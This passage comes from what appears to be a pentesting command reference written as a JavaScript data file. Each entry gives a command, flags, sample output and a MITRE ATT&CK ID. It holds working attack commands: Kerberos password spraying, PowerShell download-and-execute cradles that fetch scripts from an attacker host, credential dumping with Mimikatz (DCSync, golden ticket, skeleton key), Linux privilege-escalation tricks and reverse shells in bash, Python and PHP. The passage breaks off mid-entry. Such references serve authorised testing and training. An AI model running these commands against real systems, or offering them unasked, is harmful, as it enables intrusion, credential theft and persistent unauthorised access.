    {
      tool: "ldapsearch",
      command: "ldapsearch -x -H ldap://target -b 'DC=corp,DC=local' -D 'user@corp.local' -w 'password' '(objectClass=user)' sAMAccountName",
      description: "Query Active Directory via LDAP. Extract user accounts, groups, computer objects.",
      flags: { "-x": "Simple authentication", "-H": "LDAP server URI", "-b": "Search base DN", "-D": "Bind DN", "-w": "Password" },
      example: "ldapsearch -x -H ldap://10.10.10.5 -b 'DC=corp,DC=local' -D 'user@corp.local' -w 'pass' '(objectClass=user)' sAMAccountName\ndn: CN=Administrator,CN=Users,DC=corp,DC=local\nsAMAccountName: Administrator",
      category: "Enumeration",
      mitre: "T1087.002"
    },
    {
      tool: "kerbrute",
      command: "kerbrute userenum --dc <DC_IP> -d <domain> users.txt",
      description: "Enumerate valid domain usernames via Kerberos pre-authentication. No lockout risk.",
      flags: { "userenum": "Username enumeration mode", "--dc": "Domain Controller IP", "-d": "Domain name", "bruteuser": "Password spray mode", "bruteforce": "Full brute force" },
      example: "kerbrute userenum --dc 10.10.10.5 -d corp.local users.txt\n[+] VALID USERNAME: administrator@corp.local\n[+] VALID USERNAME: svc_sql@corp.local\n[+] VALID USERNAME: user1@corp.local",
      category: "Enumeration",
      mitre: "T1087.002"
    },
    {
      tool: "kerbrute",
      command: "kerbrute passwordspray --dc <DC_IP> -d <domain> users.txt 'Spring2024!'",
      description: "Password spray attack via Kerberos. Tests one password against many accounts.",
      flags: {},
      example: "kerbrute passwordspray --dc 10.10.10.5 -d corp.local users.txt 'Spring2024!'\n[+] VALID LOGIN: svc_sql@corp.local:Spring2024!",
      category: "Credential Access",
      mitre: "T1110.003"
    },
    {
      tool: "theHarvester",
      command: "theHarvester -d target.com -b google,bing,linkedin",
      description: "Gather emails, subdomains, hosts, and employee names from public sources.",
      flags: { "-d": "Target domain", "-b": "Data sources (google, bing, linkedin, shodan, etc.)", "-l": "Limit results" },
      example: "theHarvester -d target.com -b google,bing,linkedin\n[*] Emails found: 12\nadmin@target.com\nhr@target.com\n[*] Hosts found: 8\nwww.target.com\nmail.target.com",
      category: "Reconnaissance",
      mitre: "T1589"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // POWERSHELL FOR PENTESTING
  // ═══════════════════════════════════════════════════════════════════════════
  powershell: [
    {
      tool: "powershell",
      command: "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')\"",
      description: "Download and execute a PowerShell script in memory (fileless execution). Bypasses execution policy.",
      flags: { "-ep bypass": "Bypass execution policy", "-c": "Execute command string", "-enc": "Execute Base64-encoded command", "-w hidden": "Hidden window", "-nop": "No profile loading" },
      example: "powershell -ep bypass -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-Mimikatz.ps1')\"",
      category: "Execution",
      mitre: "T1059.001"
    },
    {
      tool: "powershell",
      command: "Get-Process | Select-Object Name, Id, Path",
      description: "List running processes with their names, PIDs, and executable paths.",
      flags: {},
      example: "Get-Process | Select-Object Name, Id, Path\nName          Id   Path\n----          --   ----\nchrome       3456  C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\nsvchost      1234  C:\\Windows\\System32\\svchost.exe",
      category: "Enumeration",
      mitre: "T1057"
    },
    {
      tool: "powershell",
      command: "Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess",
      description: "List established network connections with process IDs.",
      flags: {},
      example: "LocalAddress  LocalPort  RemoteAddress  RemotePort  OwningProcess\n10.10.10.5    49753      10.10.14.2     4444        3456",
      category: "Enumeration",
      mitre: "T1049"
    },
    {
      tool: "powershell",
      command: "Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet",
      description: "Enumerate local user accounts with status and password age.",
      flags: {},
      example: "Name            Enabled  LastLogon             PasswordLastSet\nAdministrator   True     9/1/2024 10:30:00 AM  8/15/2024\nGuest           False\nbackup_admin    True     9/10/2024 2:15:00 PM  1/1/2024",
      category: "Enumeration",
      mitre: "T1087.001"
    },
    {
      tool: "powershell",
      command: "Get-LocalGroupMember -Group 'Administrators'",
      description: "List members of the local Administrators group.",
      flags: {},
      example: "ObjectClass  Name                  PrincipalSource\nUser         WORKSTATION\\Administrator  Local\nUser         CORP\\Domain Admins        ActiveDirectory\nUser         CORP\\svc_backup           ActiveDirectory",
      category: "Enumeration",
      mitre: "T1069.001"
    },
    {
      tool: "powershell",
      command: "Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.xml,*.config,*.ini,*.ps1,*.bat | Select-String -Pattern 'password|credential|secret' -SimpleMatch",
      description: "Search filesystem for files containing password-related strings.",
      flags: {},
      example: "C:\\inetpub\\wwwroot\\web.config:12:  connectionString=\"Server=db;User=sa;Password=SqlP@ss123\"\nC:\\Users\\admin\\Desktop\\notes.txt:3:  RDP password: Winter2024!",
      category: "Credential Access",
      mitre: "T1552.001"
    },
    {
      tool: "powershell",
      command: "Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Select-Object TaskName, TaskPath, State",
      description: "List active scheduled tasks — check for privilege escalation opportunities.",
      flags: {},
      example: "TaskName              TaskPath             State\nBackupJob             \\Custom\\              Ready\nUpdateChecker         \\                    Ready\nGoogleUpdate          \\Google\\             Ready",
      category: "Enumeration",
      mitre: "T1053.005"
    },
    {
      tool: "powershell",
      command: "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name, DisplayName, StartType",
      description: "List running Windows services. Check for services running as SYSTEM with weak permissions.",
      flags: {},
      example: "Name           DisplayName                  StartType\nwuauserv       Windows Update               Automatic\nSQLSERVER      SQL Server (MSSQLSERVER)      Automatic\nCustomSvc      Custom Service               Manual",
      category: "Enumeration",
      mitre: "T1007"
    },
    {
      tool: "powershell",
      command: "Get-Acl 'C:\\Program Files\\CustomApp\\service.exe' | Format-List",
      description: "Check file ACL permissions. Find writable service binaries for privilege escalation.",
      flags: {},
      example: "Path   : C:\\Program Files\\CustomApp\\service.exe\nOwner  : BUILTIN\\Administrators\nAccess : BUILTIN\\Users Allow  Modify, Synchronize\n         # Users can modify! -> Replace with malicious binary",
      category: "Privilege Escalation",
      mitre: "T1574.010"
    },
    {
      tool: "powershell",
      command: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue",
      description: "Check if AlwaysInstallElevated is enabled (allows privilege escalation via MSI packages).",
      flags: {},
      example: "AlwaysInstallElevated : 1\n# If 1 in both HKLM and HKCU, create malicious MSI:\n# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 -f msi -o evil.msi\n# msiexec /quiet /qn /i evil.msi",
      category: "Privilege Escalation",
      mitre: "T1548.002"
    },
    {
      tool: "powershell",
      command: "cmdkey /list",
      description: "List stored Windows credentials. May reveal saved RDP or network credentials.",
      flags: {},
      example: "cmdkey /list\nTarget: Domain:interactive=CORP\\admin\n  Type: Domain Password\n  User: CORP\\admin\n# Use with: runas /savecred /user:CORP\\admin cmd.exe",
      category: "Credential Access",
      mitre: "T1555.004"
    },
    {
      tool: "powershell",
      command: "reg query HKLM /f password /t REG_SZ /s",
      description: "Search Windows registry for entries containing 'password'.",
      flags: {},
      example: "reg query HKLM /f password /t REG_SZ /s\nHKLM\\SOFTWARE\\CustomApp\n    ServicePassword    REG_SZ    P@ssw0rd2024",
      category: "Credential Access",
      mitre: "T1552.002"
    },
    {
      tool: "powershell",
      command: "Get-WmiObject -Class Win32_Product | Select-Object Name, Version",
      description: "List installed software with versions. Find outdated/vulnerable applications.",
      flags: {},
      example: "Name                           Version\nMicrosoft SQL Server 2019       15.0.2000.5\nApache Tomcat 8.5               8.5.41\nPHP                            7.4.3",
      category: "Enumeration",
      mitre: "T1518"
    },
    {
      tool: "powershell",
      command: "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()",
      description: "Get Active Directory domain information from a domain-joined machine.",
      flags: {},
      example: "Forest                  : corp.local\nDomainControllers       : {DC01.corp.local}\nDomainMode              : Windows2016Domain",
      category: "Enumeration",
      mitre: "T1087.002"
    },
    {
      tool: "powershell",
      command: "Get-ADUser -Filter * -Properties SamAccountName,Description,MemberOf,PasswordLastSet,LastLogonDate | Select-Object SamAccountName,Description,PasswordLastSet,LastLogonDate",
      description: "Enumerate all Active Directory users with key properties. Requires RSAT or AD module.",
      flags: {},
      example: "SamAccountName  Description           PasswordLastSet      LastLogonDate\nadministrator   Built-in admin        1/15/2024            9/10/2024\nsvc_sql         SQL Service Account   3/1/2023             9/11/2024\nbackup_admin    Temp admin - pass123  6/1/2024             8/30/2024",
      category: "Enumeration",
      mitre: "T1087.002"
    },
    {
      tool: "powershell",
      command: "Get-ADGroup -Filter * | Select-Object Name, GroupCategory, GroupScope",
      description: "Enumerate all Active Directory groups.",
      flags: {},
      example: "Name                GroupCategory  GroupScope\nDomain Admins       Security       Global\nDomain Users        Security       Global\nIT-Admins           Security       Global\nSQL-Admins          Security       DomainLocal",
      category: "Enumeration",
      mitre: "T1069.002"
    },
    {
      tool: "powershell",
      command: "Get-ADComputer -Filter * -Properties OperatingSystem,OperatingSystemVersion,LastLogonDate | Select-Object Name,OperatingSystem,LastLogonDate",
      description: "Enumerate all Active Directory computer objects with OS information.",
      flags: {},
      example: "Name   OperatingSystem                     LastLogonDate\nDC01   Windows Server 2019 Standard       9/11/2024\nWS01   Windows 10 Enterprise              9/10/2024\nWEB01  Windows Server 2016 Standard       9/11/2024",
      category: "Enumeration",
      mitre: "T1018"
    },
    {
      tool: "powershell",
      command: "Test-NetConnection -ComputerName <target> -Port 445",
      description: "Test network connectivity to a specific port. PowerShell alternative to telnet/nc.",
      flags: {},
      example: "Test-NetConnection -ComputerName 10.10.10.5 -Port 445\nTcpTestSucceeded : True",
      category: "Enumeration",
      mitre: "T1046"
    },
    {
      tool: "powershell",
      command: "1..1024 | ForEach-Object { $result = Test-NetConnection -ComputerName <target> -Port $_ -WarningAction SilentlyContinue; if($result.TcpTestSucceeded) { \"Port $_ is open\" } }",
      description: "PowerShell port scanner — scan ports 1-1024 on target.",
      flags: {},
      example: "Port 22 is open\nPort 80 is open\nPort 443 is open\nPort 445 is open",
      category: "Scanning",
      mitre: "T1046"
    },
    {
      tool: "powershell",
      command: "Invoke-WebRequest -Uri http://attacker/tool.exe -OutFile C:\\Windows\\Temp\\tool.exe",
      description: "Download file from attacker server. PowerShell alternative to wget/curl.",
      flags: {},
      example: "Invoke-WebRequest -Uri http://10.10.14.2/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe\n# Alt: (New-Object Net.WebClient).DownloadFile('http://10.10.14.2/nc.exe','C:\\Windows\\Temp\\nc.exe')",
      category: "File Transfer",
      mitre: "T1105"
    },
    {
      tool: "powershell",
      command: "$SecPassword = ConvertTo-SecureString 'P@ss123' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('CORP\\admin', $SecPassword); Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock { whoami }",
      description: "Execute command on remote computer using PowerShell Remoting (WinRM).",
      flags: {},
      example: "Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock { whoami }\ncorp\\admin",
      category: "Lateral Movement",
      mitre: "T1021.006"
    },
    {
      tool: "powershell",
      command: "Enter-PSSession -ComputerName DC01 -Credential $Cred",
      description: "Start interactive PowerShell remote session on target computer.",
      flags: {},
      example: "[DC01]: PS C:\\Users\\admin> whoami\ncorp\\admin\n[DC01]: PS C:\\Users\\admin> hostname\nDC01",
      category: "Lateral Movement",
      mitre: "T1021.006"
    },
    {
      tool: "powershell",
      command: "Get-EventLog -LogName Security -InstanceId 4624 -Newest 50 | Select-Object TimeGenerated, ReplacementStrings",
      description: "Query Windows Security Event Log for recent successful logon events.",
      flags: {},
      example: "TimeGenerated        ReplacementStrings\n9/11/2024 10:30 AM   {S-1-5-21-..., admin, CORP, 10, ...}",
      category: "Log Analysis",
      mitre: "T1070.001"
    },
    {
      tool: "powershell",
      command: "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 100 | Select-Object TimeCreated, Message",
      description: "Query failed logon events (Event ID 4625). Detect brute force attempts.",
      flags: {},
      example: "TimeCreated          Message\n9/11/2024 10:15 AM   An account failed to log on.\n                     Account Name: admin\n                     Source Network Address: 10.10.14.2\n                     Failure Reason: Unknown user name or bad password",
      category: "Log Analysis",
      mitre: "T1110"
    },
    {
      tool: "powershell",
      command: "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 50 | ForEach-Object { $_.Properties[5].Value }",
      description: "Query process creation events (Event ID 4688) — see what commands were run.",
      flags: {},
      example: "C:\\Windows\\System32\\cmd.exe\nC:\\Windows\\System32\\whoami.exe\nC:\\Windows\\Temp\\mimikatz.exe",
      category: "Log Analysis",
      mitre: "T1057"
    },
    {
      tool: "powershell",
      command: "Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts",
      description: "View the hosts file. Check for unusual entries that might indicate compromise or DNS hijacking.",
      flags: {},
      example: "127.0.0.1       localhost\n10.10.10.50     evil-c2.com   # suspicious!",
      category: "Enumeration",
      mitre: "T1565.001"
    },
    {
      tool: "powershell",
      command: "Get-DnsClientCache | Select-Object Entry, Data",
      description: "View DNS cache — shows recently resolved domains. Useful for finding C2 communication.",
      flags: {},
      example: "Entry                       Data\nwww.google.com              142.250.80.4\nevil-c2.badactor.com        45.33.32.156  # suspicious!",
      category: "Enumeration",
      mitre: "T1016.001"
    },
    {
      tool: "powershell",
      command: "netsh advfirewall firewall show rule name=all | Select-String -Pattern 'Rule Name|Direction|Action|LocalPort'",
      description: "List all Windows Firewall rules. Find allowed ports and potential gaps.",
      flags: {},
      example: "Rule Name:   Allow RDP\nDirection:   In\nAction:      Allow\nLocalPort:   3389",
      category: "Enumeration",
      mitre: "T1016"
    },
    {
      tool: "powershell",
      command: "whoami /priv",
      description: "List current user's privileges. Key privs to look for: SeImpersonate, SeBackup, SeRestore, SeDebug, SeTakeOwnership.",
      flags: {},
      example: "PRIVILEGES INFORMATION\n----------------------\nSeImpersonatePrivilege  Impersonate a client  Enabled  <-- potato attack!\nSeBackupPrivilege       Back up files         Enabled  <-- read any file!\nSeDebugPrivilege        Debug programs        Enabled  <-- inject into processes!",
      category: "Enumeration",
      mitre: "T1078"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // MIMIKATZ
  // ═══════════════════════════════════════════════════════════════════════════
  mimikatz: [
    {
      tool: "mimikatz",
      command: "mimikatz # privilege::debug",
      description: "Enable debug privilege — required before most credential extraction commands.",
      flags: {},
      example: "mimikatz # privilege::debug\nPrivilege '20' OK",
      category: "Setup",
      mitre: "T1134"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # sekurlsa::logonpasswords",
      description: "Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory.",
      flags: {},
      example: "mimikatz # sekurlsa::logonpasswords\nAuthentication Id : 0 ; 999999\nSession           : Interactive from 1\nUser Name         : admin\nDomain            : CORP\nNTLM              : 31d6cfe0d16ae931b73c59d7e0c089c0\nPassword          : P@ssw0rd2024",
      category: "Credential Access",
      mitre: "T1003.001"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # sekurlsa::wdigest",
      description: "Extract WDigest plaintext credentials from memory (if WDigest authentication is enabled).",
      flags: {},
      example: "mimikatz # sekurlsa::wdigest\n* Username : admin\n* Domain   : CORP\n* Password : P@ssw0rd2024",
      category: "Credential Access",
      mitre: "T1003.001"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # sekurlsa::tickets /export",
      description: "Extract and export all Kerberos tickets from memory.",
      flags: { "/export": "Save tickets to .kirbi files" },
      example: "mimikatz # sekurlsa::tickets /export\n[+] Saved to: [0;3e7]-0-0-40a50000-Administrator@krbtgt-CORP.LOCAL.kirbi",
      category: "Credential Access",
      mitre: "T1558"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # lsadump::sam",
      description: "Dump SAM database from a running system or offline SAM/SYSTEM files.",
      flags: { "/sam": "Offline SAM file path", "/system": "Offline SYSTEM file path" },
      example: "mimikatz # lsadump::sam\nRID  : 000001f4 (500)\nUser : Administrator\nHash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0",
      category: "Credential Access",
      mitre: "T1003.002"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # lsadump::dcsync /user:Administrator",
      description: "DCSync attack — simulate a domain controller and request password hashes via Directory Replication Service.",
      flags: { "/user": "Target user to replicate", "/domain": "Target domain", "/all": "Dump all users" },
      example: "mimikatz # lsadump::dcsync /user:Administrator\nHash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0\n\nmimikatz # lsadump::dcsync /user:krbtgt\n# krbtgt hash enables Golden Ticket creation",
      category: "Credential Access",
      mitre: "T1003.006"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234 /krbtgt:<hash> /ptt",
      description: "Create and inject a Golden Ticket — forged TGT for persistent domain admin access.",
      flags: { "/user": "Username to impersonate", "/domain": "Domain", "/sid": "Domain SID", "/krbtgt": "krbtgt NTLM hash", "/ptt": "Pass-the-ticket (inject into session)" },
      example: "mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234 /krbtgt:a1b2c3d4 /ptt\n[+] Ticket successfully submitted for current session",
      category: "Persistence",
      mitre: "T1558.001"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # kerberos::ptt ticket.kirbi",
      description: "Pass-the-ticket — inject a previously extracted or forged Kerberos ticket into the current session.",
      flags: {},
      example: "mimikatz # kerberos::ptt admin_tgt.kirbi\n[+] Ticket successfully submitted for current session\n# Now: dir \\\\dc01\\c$ works as admin",
      category: "Lateral Movement",
      mitre: "T1550.003"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:<hash> /run:cmd.exe",
      description: "Pass-the-hash — start a new process authenticated with an NTLM hash instead of a password.",
      flags: { "/user": "Username", "/domain": "Domain", "/ntlm": "NTLM hash", "/run": "Process to start" },
      example: "mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:31d6cfe0d16ae931 /run:cmd.exe\n# New cmd.exe opened with admin's credentials",
      category: "Lateral Movement",
      mitre: "T1550.002"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # vault::cred",
      description: "List saved credentials from the Windows Credential Manager vault.",
      flags: {},
      example: "mimikatz # vault::cred\nTargetName  : Domain:interactive=CORP\\admin\nCredential  : P@ssw0rd2024",
      category: "Credential Access",
      mitre: "T1555.004"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\"",
      description: "Extract saved passwords from Google Chrome browser.",
      flags: {},
      example: "mimikatz # dpapi::chrome /in:\"C:\\Users\\admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"\nURL       : https://target.com/login\nUsername  : admin@target.com\nPassword  : SecretPass123!",
      category: "Credential Access",
      mitre: "T1555.003"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # token::elevate",
      description: "Impersonate SYSTEM token. Required for some LSASS operations.",
      flags: {},
      example: "mimikatz # token::elevate\nToken Id  : 0\nUser name : NT AUTHORITY\\SYSTEM",
      category: "Privilege Escalation",
      mitre: "T1134.001"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # lsadump::lsa /patch",
      description: "Dump LSA secrets by patching LSASS process. Gets NTLM hashes and cached credentials.",
      flags: { "/patch": "Patch LSASS to dump secrets" },
      example: "mimikatz # lsadump::lsa /patch\nRID  : 000001f4 (500)\nUser : Administrator\nNTLM : 31d6cfe0d16ae931",
      category: "Credential Access",
      mitre: "T1003.004"
    },
    {
      tool: "mimikatz",
      command: "mimikatz # misc::skeleton",
      description: "Skeleton Key attack — inject a master password into the domain controller's LSASS. Any user can authenticate with the skeleton key password.",
      flags: {},
      example: "mimikatz # misc::skeleton\n[KDC] data\n[KDC] struct\n[KDC] keys patch OK\n# Now any account authenticates with password 'mimikatz' in addition to their real password",
      category: "Persistence",
      mitre: "T1556.001"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // LINUX POST-EXPLOITATION COMMANDS
  // ═══════════════════════════════════════════════════════════════════════════
  linux_post: [
    {
      tool: "linux",
      command: "find / -perm -4000 -type f 2>/dev/null",
      description: "Find all SUID binaries. SUID binaries run with the file owner's privileges — potential privilege escalation.",
      flags: { "-perm -4000": "SUID bit set", "-type f": "Files only" },
      example: "find / -perm -4000 -type f 2>/dev/null\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/local/bin/custom_tool  <-- check GTFOBins!",
      category: "Privilege Escalation",
      mitre: "T1548.001"
    },
    {
      tool: "linux",
      command: "find / -perm -2000 -type f 2>/dev/null",
      description: "Find all SGID binaries. SGID binaries run with the file group's privileges.",
      flags: { "-perm -2000": "SGID bit set" },
      example: "find / -perm -2000 -type f 2>/dev/null",
      category: "Privilege Escalation",
      mitre: "T1548.001"
    },
    {
      tool: "linux",
      command: "sudo -l",
      description: "List commands the current user can run with sudo. Check for NOPASSWD, env_keep, LD_PRELOAD.",
      flags: {},
      example: "sudo -l\nUser www-data may run the following commands:\n    (ALL) NOPASSWD: /usr/bin/vim  <-- GTFOBins: vim -c ':!/bin/bash'\n    (root) NOPASSWD: /usr/bin/find  <-- find . -exec /bin/sh \\;",
      category: "Privilege Escalation",
      mitre: "T1548.003"
    },
    {
      tool: "linux",
      command: "cat /etc/crontab && ls -la /etc/cron.* && crontab -l",
      description: "Enumerate cron jobs. Look for writable scripts run as root, wildcard injection, or PATH hijacking.",
      flags: {},
      example: "cat /etc/crontab\n*/5 * * * * root /opt/scripts/backup.sh  <-- writable? inject reverse shell!\n*/1 * * * * root cd /tmp && tar czf /backup/archive.tar.gz *  <-- wildcard injection!",
      category: "Privilege Escalation",
      mitre: "T1053.003"
    },
    {
      tool: "linux",
      command: "getcap -r / 2>/dev/null",
      description: "Find binaries with Linux capabilities set. Capabilities can provide root-equivalent powers.",
      flags: { "-r": "Recursive search" },
      example: "getcap -r / 2>/dev/null\n/usr/bin/python3.8 = cap_setuid+ep  <-- python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
      category: "Privilege Escalation",
      mitre: "T1548"
    },
    {
      tool: "linux",
      command: "cat /etc/passwd | grep -v nologin | grep -v false",
      description: "List user accounts with valid shells. Identifies accounts that can be logged into.",
      flags: {},
      example: "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash\nsvc_sql:x:1001:1001::/home/svc_sql:/bin/bash",
      category: "Enumeration",
      mitre: "T1087.001"
    },
    {
      tool: "linux",
      command: "ls -la /etc/shadow",
      description: "Check if /etc/shadow is readable. If readable by current user, extract and crack password hashes.",
      flags: {},
      example: "ls -la /etc/shadow\n-rw-r--r-- 1 root shadow 1.2K  <-- readable! Extract hashes\n# Or check if writable:\n-rw-rw-rw- 1 root shadow 1.2K  <-- add root user!",
      category: "Privilege Escalation",
      mitre: "T1003.008"
    },
    {
      tool: "linux",
      command: "find / -writable -type d 2>/dev/null",
      description: "Find all world-writable directories. Useful for dropping tools or finding PATH hijacking opportunities.",
      flags: {},
      example: "find / -writable -type d 2>/dev/null\n/tmp\n/dev/shm\n/var/tmp\n/opt/scripts  <-- if a cron runs scripts from here...",
      category: "Enumeration",
      mitre: "T1083"
    },
    {
      tool: "linux",
      command: "cat /proc/version && uname -a",
      description: "Get kernel version for kernel exploit identification (DirtyPipe, DirtyCow, PwnKit, etc.).",
      flags: {},
      example: "Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0)\n# Check searchsploit: searchsploit linux kernel 5.4",
      category: "Enumeration",
      mitre: "T1082"
    },
    {
      tool: "linux",
      command: "ss -tlnp",
      description: "List all listening TCP ports with process info. Find internal services not exposed externally.",
      flags: { "-t": "TCP", "-l": "Listening", "-n": "Numeric", "-p": "Process info" },
      example: "ss -tlnp\nState   Local Address:Port  Process\nLISTEN  127.0.0.1:3306       mysqld\nLISTEN  127.0.0.1:6379       redis-server  <-- internal Redis!\nLISTEN  0.0.0.0:22           sshd",
      category: "Enumeration",
      mitre: "T1049"
    },
    {
      tool: "linux",
      command: "cat /home/*/.bash_history 2>/dev/null",
      description: "Read bash history of all users. May contain passwords, SSH commands, or sensitive information.",
      flags: {},
      example: "cat /home/*/.bash_history 2>/dev/null\nmysql -u root -p'SqlP@ss123'\nssh admin@10.10.10.20\nsudo cp /etc/shadow /tmp/shadow_backup",
      category: "Credential Access",
      mitre: "T1552.003"
    },
    {
      tool: "linux",
      command: "find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null",
      description: "Find SSH private keys on the filesystem.",
      flags: {},
      example: "find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null\n/home/admin/.ssh/id_rsa\n/root/.ssh/id_rsa\n# Use: ssh -i /home/admin/.ssh/id_rsa admin@10.10.10.20",
      category: "Credential Access",
      mitre: "T1552.004"
    },
    {
      tool: "linux",
      command: "find / -name '*.conf' -o -name '*.config' -o -name '*.ini' -o -name '*.env' 2>/dev/null | xargs grep -l 'password\\|secret\\|key\\|token' 2>/dev/null",
      description: "Search configuration files for credentials and secrets.",
      flags: {},
      example: "/etc/mysql/debian.cnf\n/var/www/html/.env\n/opt/app/config.ini\n# Then: cat /var/www/html/.env\nDB_PASSWORD=SecretPass123",
      category: "Credential Access",
      mitre: "T1552.001"
    },
    {
      tool: "linux",
      command: "ip route && arp -a && cat /etc/resolv.conf",
      description: "Network reconnaissance — check routes, ARP cache, and DNS settings. Find internal networks.",
      flags: {},
      example: "ip route\ndefault via 10.10.10.1 dev eth0\n172.16.0.0/24 dev eth1\n\narp -a\n? (10.10.10.1) at aa:bb:cc:dd:ee:ff\n? (172.16.0.10) at 11:22:33:44:55:66  <-- internal network host!",
      category: "Enumeration",
      mitre: "T1016"
    },
    {
      tool: "linux",
      command: "docker ps && docker images && id | grep docker",
      description: "Check for Docker access. If user is in the docker group, trivial privilege escalation to root.",
      flags: {},
      example: "id | grep docker\nuid=1000(user) gid=1000(user) groups=1000(user),999(docker)\n# Privesc: docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
      category: "Privilege Escalation",
      mitre: "T1611"
    },
    {
      tool: "linux",
      command: "cat /etc/exports 2>/dev/null",
      description: "Check NFS exports. Look for no_root_squash — allows root access on mounted shares.",
      flags: {},
      example: "cat /etc/exports\n/backup *(rw,no_root_squash)  <-- mount and create SUID binary as root!\n# Exploit: mount -t nfs target:/backup /mnt; cp /bin/bash /mnt; chmod +s /mnt/bash",
      category: "Privilege Escalation",
      mitre: "T1021.005"
    },
    {
      tool: "linux",
      command: "env | grep -i proxy && cat /etc/environment",
      description: "Check environment variables for proxy settings, credentials, or API keys.",
      flags: {},
      example: "env | grep -i proxy\nHTTP_PROXY=http://user:password@proxy.corp.local:8080\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...",
      category: "Credential Access",
      mitre: "T1552.001"
    },
    {
      tool: "linux",
      command: "ls -la /tmp /var/tmp /dev/shm",
      description: "Check common world-writable directories for leftover files, tools, or artifacts from other attackers.",
      flags: {},
      example: "ls -la /tmp\n-rwxr-xr-x  1 www-data  www-data  45K  linpeas.sh\n-rw-------  1 root      root      12K  .X11-lock\n-rwxr-xr-x  1 nobody    nogroup   88K  nc",
      category: "Enumeration",
      mitre: "T1083"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // REVERSE SHELL CHEAT SHEET
  // ═══════════════════════════════════════════════════════════════════════════
  reverse_shells: [
    {
      tool: "bash",
      command: "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1",
      description: "Bash reverse shell — simplest reverse shell for Linux targets.",
      flags: {},
      example: "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1",
      category: "Reverse Shell",
      mitre: "T1059.004"
    },
    {
      tool: "python",
      command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
      description: "Python reverse shell — works on most Linux systems with Python installed.",
      flags: {},
      example: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.2\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
      category: "Reverse Shell",
      mitre: "T1059.006"
    },
    {
      tool: "php",
      command: "php -r '$sock=fsockopen(\"<IP>\",<PORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
      description: "PHP reverse shell — for web servers running PHP.",
      flags: {},
      example: "php -r '$sock=fsockopen(\"10.10.14.2\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
      category: "Reverse Shell",
      mitre: "T1059"
    },
    {
      tool: "powershell",
